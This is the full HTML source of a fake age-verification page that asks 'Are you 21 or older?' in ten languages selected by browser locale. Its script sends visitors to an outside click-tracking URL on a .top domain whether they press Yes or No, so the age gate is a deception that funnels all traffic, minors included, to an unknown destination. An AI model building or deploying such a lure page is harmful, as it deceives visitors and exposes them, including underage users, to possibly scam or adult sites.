<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
            background: #1e1e1e;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 24px;
            margin-bottom: 30px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .btn {
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            text-decoration: none;
            transition: background 0.3s;
        }
        .btn-yes {
            background-color: #e91e63;
            color: white;
        }
        .btn-no {
            background-color: #333;
            color: #aaa;
        }
        .btn:active {
            opacity: 0.8;
        }
    </style>
</head>
<body>

<div class="container">
    <h1 id="question">Are you 21 or older?</h1>
    <div class="buttons">
        <button class="btn btn-yes" id="btn-yes" onclick="redirect()">Yes</button>
        <button class="btn btn-no" id="btn-no" onclick="redirect()">No</button>
    </div>
</div>

<script>
    const targetUrl = "https://stayas.top/click?o=2&a=4634";

    const translations = {
        ru: { question: "Вам уже исполнилось 21?", yes: "Да", no: "Нет" },
        en: { question: "Are you 21 or older?", yes: "Yes", no: "No" },
        es: { question: "¿Eres mayor de 21 años?", yes: "Sí", no: "No" },
        fr: { question: "Avez-vous 21 ans ou plus ?", yes: "Oui", no: "Non" },
        de: { question: "Sind Sie 21 Jahre oder älter?", yes: "Ja", no: "Nein" },
        it: { question: "Hai almeno 21 anni?", yes: "Sì", no: "No" },
        pt: { question: "Você tem 21 anos ou mais?", yes: "Sim", no: "Não" },
        zh: { question: "您满21岁了吗？", yes: "是", no: "否" },
        ja: { question: "21歳以上ですか？", yes: "はい", no: "いいえ" },
        ko: { question: "21세 이상입니까?", yes: "예", no: "아니오" }
    };

    function init() {
        const lang = (navigator.language || navigator.userLanguage).split('-')[0];
        const t = translations[lang] || translations.en;
        
        document.getElementById('question').innerText = t.question;
        document.getElementById('btn-yes').innerText = t.yes;
        document.getElementById('btn-no').innerText = t.no;
        document.title = t.question;
    }

    function redirect() {
        window.location.href = targetUrl;
    }

    window.onload = init;
</script>

</body>
</html>
